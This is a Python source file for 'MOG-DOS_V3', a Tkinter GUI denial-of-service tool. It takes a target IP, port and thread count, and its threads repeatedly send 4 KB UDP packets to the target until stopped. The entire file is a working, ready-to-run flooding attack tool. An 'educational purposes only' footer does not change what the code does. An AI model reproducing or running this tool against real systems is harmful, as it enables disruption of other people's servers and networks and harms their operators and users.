import socket
import threading
import tkinter as tk
from tkinter import messagebox, scrolledtext

attack_running = False

def flood(target_ip, target_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = b'X' * 4096  # 4kb of data
    while attack_running:
        try:
            client.sendto(bytes_to_send, (target_ip, target_port))
            log_message(f"Sent packet to {target_ip}:{target_port}")
        except Exception as e:
            log_message(f"Error: {e}")
            break

def start_attack():
    global attack_running
    attack_running = True
    target_ip = ip_entry.get()
    try:
        target_port = int(port_entry.get())
        num_threads = int(threads_entry.get())
    except ValueError:
        messagebox.showerror("Error", "Port and Threads must be numbers!")
        return
    
    if not target_ip or not target_port or not num_threads:
        messagebox.showerror("Error", "Please fill in all fields!")
        return
    
    for i in range(num_threads):
        thread = threading.Thread(target=flood, args=(target_ip, target_port))
        thread.daemon = True
        thread.start()
    
    log_message(f"Started attack on {target_ip}:{target_port} with {num_threads} threads.")
    messagebox.showinfo("Attack Started", f"Flooding {target_ip}:{target_port} with {num_threads} threads.")

def stop_attack():
    global attack_running
    attack_running = False
    log_message("Attack stopped.")
    messagebox.showinfo("Attack Stopped", "The attack has been stopped.")

def log_message(message):
    status_box.insert(tk.END, f"{message}\n")
    status_box.see(tk.END)

def animate_title():
    current_color = title_label.cget("fg")
    next_color = "#ffffff" if current_color == "#ff4500" else "#ff4500"
    title_label.config(fg=next_color)
    root.after(500, animate_title)

root = tk.Tk()
root.title("MOG-DOS_V3 made by @misterofgames_yt")
root.geometry("900x700")
root.configure(bg="#2c2f33")

title_label = tk.Label(root, text="MOG-DOS_V3", font=("Helvetica", 48, "bold"), bg="#2c2f33", fg="#ff4500")
title_label.pack(pady=20)
animate_title()

input_frame = tk.Frame(root, bg="#2c2f33")
input_frame.pack(pady=20)

tk.Label(input_frame, text="Target IP Address:", bg="#2c2f33", fg="white", font=("Helvetica", 16)).grid(row=0, column=0, padx=10, pady=10)
ip_entry = tk.Entry(input_frame, font=("Helvetica", 16), width=30)
ip_entry.grid(row=0, column=1, padx=10)

tk.Label(input_frame, text="Target Port:", bg="#2c2f33", fg="white", font=("Helvetica", 16)).grid(row=1, column=0, padx=10, pady=10)
port_entry = tk.Entry(input_frame, font=("Helvetica", 16), width=30)
port_entry.grid(row=1, column=1, padx=10)

tk.Label(input_frame, text="Number of Threads:", bg="#2c2f33", fg="white", font=("Helvetica", 16)).grid(row=2, column=0, padx=10, pady=10)
threads_entry = tk.Entry(input_frame, font=("Helvetica", 16), width=30)
threads_entry.grid(row=2, column=1, padx=10)

button_frame = tk.Frame(root, bg="#2c2f33")
button_frame.pack(pady=20)

start_button = tk.Button(button_frame, text="Start Attack", command=start_attack,
                         bg="#ff4500", fg="white", font=("Helvetica", 16), padx=20, pady=10)
start_button.grid(row=0, column=0, padx=20)

stop_button = tk.Button(button_frame, text="Stop Attack", command=stop_attack,
                        bg="#7289da", fg="white", font=("Helvetica", 16), padx=20, pady=10)
stop_button.grid(row=0, column=1, padx=20)

status_label = tk.Label(root, text="Status Log:", bg="#2c2f33", fg="white", font=("Helvetica", 18))
status_label.pack(pady=(20, 5))

status_box = scrolledtext.ScrolledText(root, wrap=tk.WORD, font=("Consolas", 14), height=15, width=80)
status_box.pack(pady=(0, 20))

footer_label = tk.Label(root,
                        text="For educational purposes only. Unauthorized use is illegal.",
                        bg="#23272a", fg="white",
                        font=("Helvetica", 12))
footer_label.pack(side=tk.BOTTOM)

root.mainloop()
